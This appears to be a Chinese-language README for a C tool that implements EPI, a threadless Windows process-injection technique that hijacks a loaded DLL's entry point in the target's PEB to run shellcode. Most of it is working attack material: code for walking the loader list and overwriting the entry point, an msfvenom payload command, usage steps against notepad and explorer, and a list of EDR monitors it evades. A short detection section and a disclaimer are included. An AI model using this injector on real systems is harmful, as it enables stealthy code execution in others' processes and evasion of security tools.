# EPI (Entry Point Injection) - DLL 入口点劫持注入

## 概述

**EPI (Entry Point Injection)** 是一种新颖的无线程进程注入技术，通过劫持目标进程中已加载 DLL 的入口点（DllMain）来实现代码执行。当新线程被创建或现有线程退出时，Windows 会自动调用所有已加载模块的入口点，从而触发注入的 shellcode 执行。

## 技术原理

### 核心思想

传统的进程注入通常需要创建远程线程、使用 APC 或劫持线程上下文。EPI 采用了一种完全不同的方法：

1. 修改目标进程 PEB（Process Environment Block）中的模块加载信息
2. 将已加载 DLL（如 kernelbase.dll）的入口点重定向到注入的 shellcode
3. 等待 Windows 在线程创建/退出时自动调用这些入口点
4. Shellcode 在正常的线程初始化/清理流程中执行

### 为什么要劫持 DLL 入口点？

Windows 在以下情况会调用 DLL 的入口点（DllMain）：

- **新线程创建时**：`DLL_THREAD_ATTACH` - Windows 通知所有 DLL 有新线程加入
- **线程退出时**：`DLL_THREAD_DETACH` - Windows 通知所有 DLL 线程即将退出
- **进程启动时**：`DLL_PROCESS_ATTACH` - DLL 首次加载到进程
- **进程退出时**：`DLL_PROCESS_DETACH` - 进程即将终止

通过劫持入口点，我们的 shellcode 会在这些正常的 Windows 机制下被调用。

### 执行流程

```
[注入器进程]
  1. 打开目标进程
     └─> OpenProcess(PROCESS_VM_* | PROCESS_QUERY_INFORMATION)

  2. 分配内存并写入 shellcode
     └─> VirtualAllocEx(PAGE_EXECUTE_READ)
     └─> WriteProcessMemory(shellcode)

  3. 获取目标进程 PEB
     └─> NtQueryInformationProcess(ProcessBasicInformation)
     └─> ReadProcessMemory(PEB)

  4. 遍历 PEB_LDR_DATA 中的模块链表
     └─> ReadProcessMemory(PEB_LDR_DATA)
     └─> 遍历 InLoadOrderModuleList

  5. 找到目标 DLL 的 LDR_DATA_TABLE_ENTRY
     └─> 读取 BaseDllName
     └─> 比较是否为 kernelbase.dll

  6. 劫持入口点
     └─> WriteProcessMemory(LDR_DATA_TABLE_ENTRY.EntryPoint, shellcodeAddr)

  7. 触发执行（可选）
     └─> 等待自然触发：等待目标进程创建/销毁线程
     └─> 强制触发：CreateRemoteThread(ExitThread)

[目标进程]
  当新线程创建或线程退出时：
  1. Windows 调用 ntdll!LdrpCallInitRoutine
  2. 遍历所有已加载模块的入口点
  3. 调用我们劫持的 kernelbase.dll 入口点
     └─> 实际执行注入的 shellcode
  4. Shellcode 执行
  5. 进程继续正常运行
```

### 关键数据结构

#### 1. PEB (Process Environment Block)

```c
typedef struct _PEB {
    // ... 其他字段
    PPEB_LDR_DATA Ldr;  // 指向 PEB_LDR_DATA 的指针
    // ... 其他字段
} PEB, *PPEB;
```

#### 2. PEB_LDR_DATA

```c
typedef struct _PEB_LDR_DATA_EXT {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;           // 加载顺序链表
    LIST_ENTRY InMemoryOrderModuleList;         // 内存顺序链表
    LIST_ENTRY InInitializationOrderModuleList; // 初始化顺序链表
} PEB_LDR_DATA_EXT, *PPEB_LDR_DATA_EXT;
```

#### 3. LDR_DATA_TABLE_ENTRY

```c
typedef struct _LDR_DATA_TABLE_ENTRY_EXT {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;              // DLL 基地址
    PVOID EntryPoint;           // DLL 入口点（DllMain）⭐ 劫持目标
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName; // DLL 名称（如 "kernelbase.dll"）
    // ... 其他字段
} LDR_DATA_TABLE_ENTRY_EXT, *PLDR_DATA_TABLE_ENTRY_EXT;
```

### 关键代码

#### 1. 获取远程 PEB

```c
PVOID GetRemotePEB(HANDLE hProcess) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    return (status == 0) ? pbi.PebBaseAddress : NULL;
}
```

#### 2. 遍历模块链表

```c
PEB_LDR_DATA_EXT ldrData;
ReadProcessMemory(hProcess, remotePeb.Ldr, &ldrData, sizeof(ldrData), &bytesRead);

PLIST_ENTRY currentEntry = ldrData.InLoadOrderModuleList.Flink;
PLIST_ENTRY firstEntry = currentEntry;

do {
    LDR_DATA_TABLE_ENTRY_EXT entry;
    PLDR_DATA_TABLE_ENTRY_EXT remoteEntryAddr = CONTAINING_RECORD(
        currentEntry,
        LDR_DATA_TABLE_ENTRY_EXT,
        InLoadOrderLinks
    );

    ReadProcessMemory(hProcess, remoteEntryAddr, &entry, sizeof(entry), &bytesRead);

    // 读取 DLL 名称
    wchar_t dllName[256] = {0};
    ReadProcessMemory(hProcess, entry.BaseDllName.Buffer, dllName,
                    entry.BaseDllName.Length, &bytesRead);

    // 检查是否是目标 DLL
    if (_wcsicmp(dllName, L"kernelbase.dll") == 0) {
        // 找到目标！
    }

    currentEntry = entry.InLoadOrderLinks.Flink;
} while (currentEntry != firstEntry);
```

#### 3. 劫持入口点

```c
PVOID newEntryPoint = shellcodeAddr;
PVOID entryPointFieldAddr = (PVOID)((ULONG_PTR)remoteEntryAddr +
                                    FIELD_OFFSET(LDR_DATA_TABLE_ENTRY_EXT, EntryPoint));

WriteProcessMemory(hProcess, entryPointFieldAddr, &newEntryPoint,
                  sizeof(PVOID), &bytesWritten);
```

#### 4. 强制触发

```c
// 创建一个调用 ExitThread 的线程
// 该线程退出前会调用所有 DLL 的 DLL_THREAD_DETACH
LPTHREAD_START_ROUTINE pExitThread =
    (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "ExitThread");

HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    pExitThread,  // 线程入口点为 ExitThread
    NULL,
    0,
    NULL
);
```

## 技术优势

### 1. 绕过检测

- ✅ **无需 CreateRemoteThread（Threadless 模式）**：等待自然触发时不创建线程
- ✅ **无需 QueueUserAPC**：不使用 APC 机制
- ✅ **无需 SetThreadContext**：不修改线程上下文
- ✅ **无 Hooking**：不在 RX 内存区域插入 JMP/CALL 指令
- ✅ **新线程起始地址正常**：即使使用 -f 强制触发，起始地址指向 ExitThread 而非 shellcode

### 2. 隐蔽性

- 利用 Windows 正常的 DLL 加载/卸载机制
- Shellcode 在合法的线程初始化/清理流程中执行
- 不创建可疑的 RWX 内存区域
- 不在知名 DLL 的 RX 页面创建私有内存

### 3. 稳定性

- 目标进程可以继续正常执行
- 不破坏原始的 DLL 代码
- 利用 Windows 内部机制，兼容性好

### 4. 灵活性

- **Threadless 模式**：等待自然触发（最隐蔽）
- **Threaded 模式**：强制触发（快速执行）
- 可选择不同的目标 DLL

## 使用方法

### 编译

```bash
# Windows (MinGW)
build.bat

# Linux/Git Bash
bash build.sh

# 手动编译
gcc -O2 -o build\epi.exe src\epi.c -lntdll
```

### 准备 Shellcode

```bash
# 使用 msfvenom 生成 shellcode
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin

# 或使用其他 shellcode 生成器
```

### 执行

#### 1. Threadless 模式（推荐）

```cmd
# 基本用法 - 等待自然触发
build\epi.exe <PID> <shellcode文件>

# 示例：注入到记事本
start notepad
tasklist | findstr notepad  # 获取 PID (如 1234)
build\epi.exe 1234 payload.bin

# 触发执行：在记事本中执行操作
# - 点击 "文件" -> "打开"（创建新线程）
# - 点击 "取消"（销毁线程）

# 输出示例：
# ======================================
#   EPI - DLL 入口点劫持注入
# ======================================
#
# [1] 打开目标进程
#     [+] 成功打开进程 PID=1234
#
# [2] 分配内存并写入 Shellcode
#     [+] 已分配内存：0x00000123ABCD0000（大小：296 字节）
#     [+] Shellcode 已写入（296 字节）
#
# [3] 劫持 DLL 入口点
#     [*] 目标 DLL：kernelbase.dll
#
# [+] 目标进程 PEB 地址：0x00007FFFFFFF0000
# [+] PEB_LDR_DATA 地址：0x00007FFFFFFF1234
# [+] 已加载模块链表地址：0x00007FFFFFFF2000
#
# [*] 遍历已加载模块链表...
#     [*] DLL: ntdll.dll                   (Base: 0x00007FF8B2C00000, EntryPoint: 0x00007FF8B2C12000)
#     [*] DLL: kernel32.dll                (Base: 0x00007FF8B0A00000, EntryPoint: 0x00007FF8B0A14000)
#     [*] DLL: kernelbase.dll              (Base: 0x00007FF8AE800000, EntryPoint: 0x00007FF8AE812000)
#
# [+] 找到目标 DLL：kernelbase.dll
#     [*] DllBase：0x00007FF8AE800000
#     [*] 原始 EntryPoint：0x00007FF8AE812000
#     [*] 新 EntryPoint（Shellcode）：0x00000123ABCD0000
# [+] EntryPoint 已成功劫持！
#
# [*] 等待新线程创建或线程退出时自动触发...
# [*] 提示：在目标进程中执行操作（如打开文件、点击按钮）来创建新线程
#
# [+] EPI 注入成功！
# [!] 注意：请勿关闭目标进程，否则 shellcode 将无法执行
```

#### 2. Threaded 模式（强制触发）

```cmd
# 使用 -f 选项立即触发
build\epi.exe <PID> <shellcode文件> -f

# 示例
build\epi.exe 1234 payload.bin -f

# 输出示例（额外部分）：
# [*] 强制触发 shellcode 执行...
# [+] ExitThread 地址：0x00007FF8B0A15000
# [+] 已创建远程线程（句柄：0x000001AC）
# [*] 线程将调用 ExitThread 并触发 DLL 入口点
#
# [+] EPI 注入成功！
```

#### 3. 自定义目标 DLL

```cmd
# 使用 -d 选项指定目标 DLL
build\epi.exe <PID> <shellcode文件> -d <DLL名称> [-f]

# 示例：劫持 kernel32.dll
build\epi.exe 1234 payload.bin -d kernel32.dll -f

# 常见可选目标 DLL：
# - kernelbase.dll (默认，推荐)
# - kernel32.dll
# - user32.dll (GUI 程序)
# - ntdll.dll (所有进程都加载)
```

## 推荐目标进程

### 最佳目标

1. **Sublime Text / VS Code / Notepad++**（文本编辑器）
   - 经常创建/销毁线程
   - 打开文件对话框即可触发

2. **Explorer.exe**（资源管理器）
   - 持续运行
   - 频繁的用户交互
   - 后台线程活跃

3. **notepad.exe**（记事本）
   - 简单易用
   - 打开文件即可触发

### 触发方法

| 目标进程 | 触发方法 |
|---------|---------|
| notepad.exe | 点击 "文件" -> "打开" 或 "另存为" |
| explorer.exe | 打开文件夹、刷新窗口 |
| Sublime Text | 打开文件对话框、搜索 |
| 任何 GUI 程序 | 任何导致窗口重绘或 I/O 操作的用户交互 |

## 防御检测

### EDR/AV 绕过

- **线程创建监控**：✅ 绕过（Threadless 模式）⚠️ 检测（Threaded 模式，但起始地址为 ExitThread）
- **APC 注入监控**：✅ 绕过（不使用 APC）
- **线程上下文修改监控**：✅ 绕过（不修改上下文）
- **内存分配监控**：⚠️ 仍使用 VirtualAllocEx
- **内存写入监控**：⚠️ 仍使用 WriteProcessMemory
- **PEB 修改监控**：⚠️ 修改 LDR_DATA_TABLE_ENTRY

### 检测方法

1. **PEB 完整性检查**：
   - 监控 PEB_LDR_DATA 的修改
   - 检查 LDR_DATA_TABLE_ENTRY.EntryPoint 是否指向非 DLL 内存

2. **模块入口点验证**：
   - 验证每个已加载模块的入口点是否在其模块基址范围内
   - 检测入口点指向 VirtualAllocEx 分配的内存

3. **行为分析**：
   - 监控 DLL 入口点从外部被修改
   - 检测 WriteProcessMemory 写入到 PEB/LDR 结构

## 局限性

1. **DLL 加载要求**：
   - 目标 DLL 必须已被目标进程加载
   - 不同进程加载的 DLL 可能不同

2. **触发时机不确定**（Threadless 模式）：
   - 依赖目标进程创建/销毁线程
   - 某些进程可能很少创建新线程
   - 需要用户在目标进程中执行操作

3. **一次性执行**：
   - Shellcode 应该设计为一次性执行或自我持久化
   - 每次线程创建/销毁都会调用入口点（需注意重复执行）

4. **兼容性**：
   - 依赖 Windows 内部结构（PEB、LDR）
   - 不同 Windows 版本结构可能有差异

## 原始研究

- **研究者**：Kudaes
- **发布时间**：2023
- **参考实现**：[Kudaes/EPI](https://github.com/Kudaes/EPI)
- **语言**：原始版本使用 Rust，本实现使用 C

## MITRE ATT&CK

- **战术**：Defense Evasion, Privilege Escalation
- **技术**：T1055 (Process Injection)
- **子技术**：T1055.001 (Dynamic-link Library Injection)

## 相关技术

- **Module Stomping**：覆写已加载模块
- **Threadless Inject**：Hook 导出函数触发
- **Process Doppelgänging**：事务性进程创建
- **Process Ghosting**：Delete-pending 文件创建进程

## 技术对比

| 技术 | 创建线程 | 修改 PEB | Hook/Patch | 触发方式 |
|------|---------|---------|-----------|---------|
| CreateRemoteThread | ✅ | ❌ | ❌ | 立即执行 |
| APC 注入 | ❌ | ❌ | ❌ | Alertable 状态 |
| Threadless Inject | ❌ | ❌ | ✅ | 函数调用 |
| **EPI** | ❌ (Threadless) | ✅ | ❌ | 线程创建/退出 |
| **EPI -f** | ✅ (ExitThread) | ✅ | ❌ | 立即执行 |

## 测试环境

- **操作系统**：Windows 10/11 (x64)
- **编译器**：GCC (MinGW-w64)
- **架构**：x64（仅支持 64 位）

## 免责声明

本技术仅供安全研究和教育目的使用。使用者应遵守当地法律法规，不得用于非法用途。作者不对任何滥用行为负责。

## 参考资料

- [EPI GitHub](https://github.com/Kudaes/EPI)
- [Process Environment Block (PEB) - Microsoft](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
- [DllMain Entry Point - Microsoft](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain)
- [Process Injection - MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)
